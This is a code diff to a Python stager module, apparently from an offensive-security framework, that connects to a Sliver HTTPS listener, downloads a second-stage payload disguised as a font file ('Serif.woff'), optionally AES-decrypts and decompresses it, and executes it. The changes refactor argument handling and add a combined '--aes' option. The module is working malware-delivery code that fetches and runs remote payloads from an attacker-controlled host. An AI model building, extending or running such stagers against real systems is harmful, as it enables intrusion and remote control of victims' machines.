@@ -1,6 +1,6 @@
 ########################################################
 ### Sliver Module
-### Status: cleaned, 083
+### Status: migrated 084, implement aes arg, code cleanup
 ###
 ########################################################
 
@@ -16,27 +16,39 @@ import requests
 CATEGORY    = 'stager'
 DESCRIPTION = 'Connect to a Sliver HTTPS listener, download stage and execute'
 
+arglist = {
+     'remote_host':         { 'value': '', 'desc': 'Remote host to connect to e.g. 192.168.2.1' },
+     'remote_port':         { 'value': 4444, 'desc': 'Remote port to connect to' },
+     'sleeptime':           { 'value': 0, 'desc': 'Sleep for x seconds before the stage is executed' },
+     'aes':                 { 'value': ['',''], 'desc': 'AES decrypt the stage after download: --aes <key> <iv>' },
+     'aes_key':             { 'value': '', 'desc': '[Deprecated] Specify the AES key for decryption' },
+     'aes_iv':              { 'value': '', 'desc': '[Deprecated] Specify the AES IV for decryption' },
+     'compression':         { 'value': 0, 'desc': 'Decompress the stage after download' },
+     'headers':             { 'value': False, 'desc': 'Print stage headers' }
+}
+
 def register_arguments(parser):
-        parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
-        parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to e.g. 192.168.2.1')
+        parser.add_argument('-p', '--remote-port', default=4444, type=int, required=True, help=arglist['remote_port']['desc'])
+        parser.add_argument('-r', '--remote-host', type=str, required=True, help=arglist['remote_host']['desc'])
         grp = parser.add_argument_group('additional')
         grp.add_argument('-a', '--aes', nargs=2, required=False, default=['', ''], help='AES decrypt the stage after download: --aes <key> <iv>')
-        grp.add_argument('-c', '--compression', default=0, action='store_true', required=False, help='Uncompress the stage after download')
-        grp.add_argument('-s', '--sleep', default=0, type=int, required=False, help='Sleep for x seconds before the stage is executed')
+        grp.add_argument('-c', '--compression', default=0, action='store_true', required=False, help=arglist['compression']['desc'])
+        grp.add_argument('-s', '--sleeptime', default=0, type=int, required=False, help=arglist['sleeptime']['desc'])
         vrb = parser.add_argument_group('more')
-        vrb.add_argument('--headers', default=0, action='store_true', required=False, help='Print stage headers')
+        vrb.add_argument('--headers', default=0, action='store_true', required=False, help=arglist['headers']['desc'])
         grp2 = parser.add_argument_group('Deprecated, will be removed in a future release')
-        grp2.add_argument('-ak', '--aes-key', default='', deprecated=True, type=str, required=False, help='[Deprecated] Specify the AES key for decryption')
-        grp2.add_argument('-ai', '--aes-iv', default='', deprecated=True, type=str, required=False, help='[Deprecated] Specify the AES IV for decryption')
+        grp2.add_argument('-ak', '--aes-key', default='', deprecated=True, type=str, required=False, help=arglist['aes_key']['desc'])
+        grp2.add_argument('-ai', '--aes-iv', default='', deprecated=True, type=str, required=False, help=arglist['aes_iv']['desc'])
 
 class module:
     
     Author = 'psycore8'
-    Version = '2.1.7'
+    Version = '2.1.8'
     DisplayName = 'SLIVER-STAGER'
     payload_size = 0
     header_16bytes = ''
     relay = False
+    shell_path = '::stager::sliver'
     requests.packages.urllib3.disable_warnings() 
 
     import gzip
@@ -71,17 +83,18 @@ class module:
         if ErrorExit:
             exit()
 
-    def __init__(self, remote_host=str, remote_port=int, sleeptime=int, aes_key=None, aes_iv=None, compression=False, headers=False):
+    def __init__(self, remote_host=str, remote_port=int, sleeptime=int, aes=['', ''], aes_key=None, aes_iv=None, compression=False, headers=False):
         self.remote_host = remote_host
         self.remote_port = remote_port
         self.sleeptime = sleeptime
         self.compression = compression
         self.headers = headers
+        self.aes = aes
         self.aes_key = aes_key
         self.aes_iv = aes_iv
 
-    def aes_decrypt(self, data):
-        cipher = Cipher(algorithms.AES(self.aes_key.encode('utf-8')), modes.CBC(self.aes_iv.encode('utf-8')), backend=default_backend())
+    def aes_decrypt(self, data, aes_key, aes_iv):
+        cipher = Cipher(algorithms.AES(aes_key.encode('utf-8')), modes.CBC(aes_iv.encode('utf-8')), backend=default_backend())
         decryptor = cipher.decryptor()
         decrypted_padded = decryptor.update(data) + decryptor.finalize()
         def unpad(data):
@@ -99,6 +112,13 @@ class module:
          self.msg('proc.header')
 
     def process(self):
+        if self.aes != ['', '']:
+             aes_key = self.aes[0]
+             aes_iv = self.aes[1]
+             print(f'{aes_key} - {aes_iv}')
+        else:
+             aes_key = self.aes_key
+             aes_iv = self.aes_iv
         print(f'{self.aes_key} - {self.aes_iv}')
         self.msg('pre.head')
         static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
@@ -113,10 +133,10 @@ class module:
         except requests.exceptions.RequestException as e:
             self.msg('error.stage_ok')
 
-        if len(self.aes_key) > 1:
+        if len(aes_key) > 1:
             self.msg('proc.decrypt')
             if self.headers: self.ph(stage_data[0:16], len(stage_data))
-            stage_data = self.aes_decrypt(stage_data[16:])
+            stage_data = self.aes_decrypt(stage_data[16:], aes_key, aes_iv)
             if self.headers: self.ph(stage_data[0:16], len(stage_data))
         if self.compression:
             self.msg('proc.decomp')
